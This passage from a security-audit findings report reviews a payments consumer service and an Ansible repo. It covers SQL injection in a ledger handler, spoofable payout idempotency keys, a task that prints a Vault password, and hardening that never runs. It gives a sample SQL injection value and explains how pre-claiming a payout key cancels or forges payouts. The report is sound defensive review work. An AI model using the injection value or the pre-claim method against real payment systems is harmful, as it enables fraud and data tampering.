    )
```
(src/handlers/ledgerPosting.js:33-38)

`p` is `envelope.payload` (src/handlers/ledgerPosting.js:20), i.e. data that entered the process from the Redis stream at src/consumer.js:49. `accountId` and `reference` are correctly bound as `$1`/`$2`; `currency` is concatenated into the statement text inside single quotes. The comment above it ("Currency is part of the partition key, so it goes into the statement text") records the intent, but a partition key does not require interpolation - it can be bound like the others.

The sink is a genuine, unparameterised SQL construction: a `currency` value of `EUR', now()) --` closes the tuple and comments out the rest, and `pg`'s simple-query path will run whatever the string becomes. Nothing in `ledger.js` or the handler re-checks the value before it reaches the database.

Honest reachability: for the only type routed to this handler, `ledger.post.v1` (src/consumer.js:28), `currency` is constrained by an Ajv enum - `const currency = { type: 'string', enum: ['EUR','USD','GBP','CHF'] }` (src/schema.js:8), referenced at src/schema.js:35 - and that validator does run before dispatch (src/consumer.js:66). So the injection is not exploitable through the currently registered route while that schema stays attached to that handler. It is reported under FP-08 as an intrinsic injection path: the safety of a money query rests entirely on an enum declared in a different module, and the same handler factory would become exploitable the moment a new event version is pointed at it - which is precisely what already happened one line below, where `payout.release.v2` was registered with no schema at all (src/consumer.js:30).
findings.impact: A directly injectable SQL statement in the ledger write path. If the payload schema for a type routed to this handler is ever missing, loosened, or version-bumped the way `payout.release.v2` was, an attacker controlling `currency` can append arbitrary SQL executed with the `tallyflow_worker` role - reading or rewriting `balances`, `postings` and `payouts`.
findings.recommendation: Bind the currency like every other column: `values ($1, $2, $3, now())` with `[p.accountId, p.reference ?? null, p.currency]`. If a literal is genuinely needed for partition routing, validate against the same enum inside the handler before formatting.

triage.reason: FP-08 explicitly directs that direct injection paths be reported even when not currently reachable; the severity is set to MEDIUM rather than CRITICAL to reflect the enum in front of it.

The enum is a working mitigation on the current route, so this sits close to the FP-05 line; it is reported because the flaw is the injection sink itself, not an invented adjacent class, and FP-08 governs.
This is not pedantic linting of a safe library used correctly - pg is being used with manual string concatenation on the same call where the other columns are bound.

scope.established_by: handlers/ledgerPosting.js:35 interpolates envelope.payload.currency directly into the SQL text of the posting_tags insert instead of binding it.
scope.narrowed_by: The single registered route to this handler (consumer.js:28, type ledger.post.v1) is validated against the four-value currency enum at schema.js:8/35, so the sink is not reachable with attacker-chosen bytes as the code stands today.

searched.for: whether currency for ledger.post.v1 is genuinely constrained, which would disqualify exploitability
searched.found: an Ajv enum of ['EUR','USD','GBP','CHF'], applied to the ledger.post.v1 payload - it does constrain the current route

searched.for: another event type that reaches makeLedgerPostingHandler without the currency enum
searched.found: only ledger.post.v1 maps to the posting handler; the unvalidated type (payout.release.v2) maps to the payout handler, which parameterises correctly

searched.for: an Ajv option such as coerceTypes or removeAdditional that could let a non-enum currency survive validation
searched.found: coerceTypes: false and removeAdditional: 'failing' - neither weakens the enum on a required property

findings.title: Payout idempotency key is taken verbatim from the message and is not bound to account, amount or destination, so an attacker can pre-claim a key and suppress or impersonate a legitimate payout
findings.class: reliance on an untrusted input for a security decision (CWE-807)
findings.evidence:
The key that decides whether a payout has "already happened" is chosen entirely by the message:

```js
    const p = envelope.payload
    const key = p.idempotencyKey ?? envelope.id

    const claim = await idempotency.claim(key)
    if (!claim.fresh) {
      log.info({ id: envelope.id, key }, 'payout already released, replaying result')
      return claim.previous?.result ?? { status: 'in-flight' }
    }
```
(src/handlers/payoutRelease.js:9-16)

and it becomes a Redis key by direct concatenation, with no per-account or per-tenant namespace:

```js
    const redisKey = `${prefix}:${key}`
    const ok = await redis.set(redisKey, JSON.stringify({ state: 'in-flight' }), 'EX', ttl, 'NX')
```
(src/idempotency.js:15-16, prefix `"ik"` from config/default.json:25)

The untrusted value enters at src/consumer.js:49 and the schema constrains it only as `idempotencyKey: { type: 'string', maxLength: 128 }` (src/schema.js:49) for `payout.release.v1` - and not at all for `payout.release.v2`, which has no schema (src/schema.js:27-52, dispatched at src/consumer.js:30). For v2 a non-string value template-coerces: an object becomes the literal key `ik:[object Object]` and an omitted/`null` value falls through to `envelope.id`, so every such event shares one global slot.

Two consequences follow directly from the key being untrusted and unbound:

1. Pre-claim suppression. An attacker who learns or guesses a producer's key (they are producer-chosen strings, not secrets, and the same key is reused on every retry by design) publishes a junk payout carrying that key first. `claim` stores it, and when the real payout arrives `claim.fresh` is false, so the handler returns at src/handlers/payoutRelease.js:15 without ever inserting the `payouts` row or debiting - a legitimate payout is silently cancelled and logged as "already released".

2. Result substitution. The value returned to the caller on the duplicate branch is `claim.previous?.result`, which is whatever the attacker's earlier claim completed with (src/idempotency.js:24 stores `{ state: 'done', result }` from src/handlers/payoutRelease.js:30-31, containing the attacker's `payoutId`, `destination` and `amountCents`). Anything reading that answer is told a payout to the attacker's destination is the outcome of the genuine request.

There is also no binding between the key and the payload: the same key deliberately unlocks the "already done" path regardless of `accountId`, `amountCents`, `currency` or `destination`, so a key seen once can be reused across accounts.
findings.impact: Denial of a specific money movement plus outcome forgery. An attacker able to publish payout events can cancel targeted legitimate payouts before they happen (the victim's release never reaches the database) and can control the payout result the platform reports back for that key, including the destination. For payout.release.v2 the unbound key type collapses many distinct payouts into a single Redis slot, so one attacker claim suppresses all of them.
findings.recommendation: Derive the idempotency key server-side instead of trusting the message: namespace it by authenticated producer and account and bind it to the payload, e.g. `ik:{producer}:{accountId}:{sha256(canonical(payload))}` or `ik:{producer}:{sha256(idempotencyKey)}`. On the duplicate branch, verify the stored claim's account/amount/destination match the incoming payload and reject the event as a conflict when they do not, rather than returning the stored result. Do not accept a non-string idempotencyKey.

triage.reason: No caller misuse involved: the handler as shipped reads the key from the message and the consumer dispatches attacker-reachable events to it.
This is not resource exhaustion - it is a targeted logic bypass that suppresses one specific payout and substitutes its reported result, with no volume required.
Not a fragile race: the claim is persisted for ttlSeconds 604800 (config/default.json:24), so the pre-claim wins for a full week and the attack can be retried at will.

scope.established_by: payoutRelease.js:10 takes the key straight from the payload and idempotency.js:15 concatenates it into a flat, un-namespaced Redis key, so any producer can occupy any other producer's idempotency slot; both registered payout types (consumer.js:29-30) use this handler.
scope.narrowed_by: The attacker must know or guess the producer's key string for the targeted-suppression variant; the payout.release.v2 route needs no guess because unvalidated non-string keys collapse to a shared slot.

searched.for: a tenant/producer namespace, a hash of the payload, or a payload-match check on the stored claim
searched.found: nothing - the key is `${prefix}:${key}` with prefix 'ik' and the stored value is only { state, result }

searched.for: a comparison of the incoming account/amount/destination against the previously stored claim before returning the duplicate result
searched.found: nothing - the handler returns claim.previous?.result without inspecting the payload

searched.looked_in: tallyflow-consumer/src/schema.js:40-51 and the envelope schema at :14-24
searched.for: a uniqueness or format constraint on idempotencyKey, or a `producer` field that is authenticated and could scope the key
searched.found: idempotencyKey is only `{ type: 'string', maxLength: 128 }` and optional; `producer` (schema.js:21) is an unauthenticated free string never used by the handlers

findings.title: rotate-secrets.yml ships a debug task that prints the live Vault database password in cleartext, with no `no_log`, next to a sibling task that has one

location.symbol: Show the value that was written

findings.evidence:
The rotation playbook resolves the production database credential into a play variable:

  playbooks/rotate-secrets.yml:6-7
    vars:
      rotated_password: "{{ lookup('community.hashi_vault.hashi_vault', 'secret=kv/stanchion/db:password') }}"

The task that writes it to disk is correctly protected (`no_log: true`, playbooks/rotate-secrets.yml:18). The very next task dumps the same value to the operator's terminal and to every callback with no protection at all:

  playbooks/rotate-secrets.yml:20-23
    - name: Show the value that was written
      ansible.builtin.debug:
        var: rotated_password
      tags: [never, troubleshoot]

The `never` tag prevents accidental execution, but it does not make the task safe — it makes it opt-in, and the task exists precisely so that an operator will opt in with `--tags troubleshoot`. When used as designed it prints the current production PostgreSQL password for user `stanchion_app` (group_vars/all.yml:41) against db-01.stanchion.net (group_vars/all.yml:38) in cleartext, once per host of `appservers:edge` (playbooks/rotate-secrets.yml:3). The contrast with line 18 shows the authors knew the value was sensitive; the guard chosen for this task controls *when* it runs, not *what* it reveals.

The output lands wherever the run's stdout lands: an operator scrollback, a CI job log (which is typically retained and readable by everyone with access to the pipeline), or a `script`/`tee` capture. ansible.cfg has no `log_path`, so there is no additional on-disk sink from the config itself, but there is also no callback-level redaction to fall back on — `stdout_callback = yaml` (ansible.cfg:6) prints the variable verbatim.
findings.impact: The production database password is disclosed in cleartext to any log or terminal that captures a rotation run invoked with `--tags troubleshoot`, defeating the Vault-backed handling used everywhere else in the repository and putting the credential into long-lived CI artifacts that outlive the rotation itself.
findings.recommendation: Delete the task — adding `no_log: true` would only print 'the output has been hidden', so the task has no safe form. If a rotation smoke test is needed, verify the effect instead of the value: assert that the service reconnects (the health check at lines 30-37 already does) or print a fingerprint such as `rotated_password | hash('sha256') | truncate(12, true, '')` rather than the secret.

triage.reason: The disclosure happens when the task is used exactly as intended — the `troubleshoot` tag exists to run it. This is the designed behaviour, not a caller abusing an API.

The `never` tag is a real, working guard against accidental execution, and this finding is about what happens on deliberate execution. Rated LOW for that reason; if the reviewer treats the tag as a sufficient control, this finding falls.
Secret origin cited exactly: the hashi_vault lookup at playbooks/rotate-secrets.yml:7, printed at line 22.

scope.established_by: The unprotected `ansible.builtin.debug: var: rotated_password` at playbooks/rotate-secrets.yml:20-23, whose value originates from the Vault lookup at playbooks/rotate-secrets.yml:7; it prints once per host of the `appservers:edge` pattern declared at line 3.
scope.narrowed_by: The `never` tag means the task is skipped on an ordinary run; it executes only when the operator passes `--tags troubleshoot` (or `--tags never`).

searched.for: a `no_log: true` on the debug task itself, which would have disqualified this finding
searched.found: nothing — only `tags: [never, troubleshoot]`; the `no_log: true` at line 18 belongs to the preceding template task

searched.for: a `log_path` (which would widen the leak to a file) or a callback/redaction setting that would suppress debug output
searched.found: no log_path; `stdout_callback = yaml` at line 6, which prints variable values verbatim

searched.for: whether the repository's convention is to mark secret-handling tasks with no_log (establishing that the omission is a deviation, not the house style)
searched.found: `no_log: true` at line 46 on the equivalent template task, confirming the convention

findings.title: The production hardening block is gated on `'production' in group_names`, a condition no host in the inventory can satisfy, so the sysctl hardening and the auditd rules on app.env never run
findings.evidence:
roles/app guards its hardening tasks on group membership:

  roles/app/tasks/main.yml:63-65
    - name: Apply the production hardening profile
      when: "'production' in group_names"
      block:

The block contains the kernel networking sysctls (roles/app/tasks/main.yml:66-75) and, more importantly, the auditd rules that watch the credential file and the release tree:

  roles/app/tasks/main.yml:77-84
    - name: Enable the auditd rules for the release tree
      ansible.builtin.copy:
        dest: /etc/audit/rules.d/stanchion.rules
        ...
          -w {{ stanchion_root }}/app.env -p wa -k stanchion_env
          -w {{ stanchion_root }}/releases -p wa -k stanchion_release

`group_names` is the list of inventory *groups* a host belongs to. inventory/production.yml defines exactly four groups — edge, appservers, bastion, datastores (lines 7, 14, 23, 29) — and no group named `production`. What is named `production` is a *variable*: `stanchion_env: production` at inventory/production.yml:3, set under `all.vars`, plus the file name itself. `group_names` for app-01 is `['all', 'appservers']` and for edge-01 `['all', 'edge']`; neither contains the string 'production'.

The condition is therefore false on every host the play touches (`hosts: appservers:edge`, playbooks/site.yml:9). The block is skipped silently — a skipped `when` is not a failure — so the run reports success and the repository reads as though production hosts are hardened and audited when neither is true. The mistake is a variable/group confusion: `stanchion_env` was the intended discriminator.
findings.impact: Two controls the repository believes are active are permanently inert on all five production hosts: the file-integrity/audit trail on /opt/stanchion/app.env and /opt/stanchion/releases (so tampering with the credential file or the release tree leaves no auditd record and no alert), and the kernel networking hardening (accept_redirects, rp_filter, kptr_restrict). The silence is the real damage: no run ever fails, so the gap is invisible in CI output and in the deploy log.
findings.recommendation: Test the variable that actually carries the environment: `when: stanchion_env == 'production'`. Add an `assert` at the top of the role that `stanchion_env is defined` so a missing value fails the run instead of silently skipping, and verify with `ansible-playbook playbooks/site.yml --check --diff --limit app-01.stanchion.net` that the auditd task now reports changed on a fresh host.

triage.reason: This is not a suggestion to add a missing hardening layer: the hardening is written, committed, and believed to be running, and a wrong condition makes it a silent no-op. The defect is the broken control, not its absence.
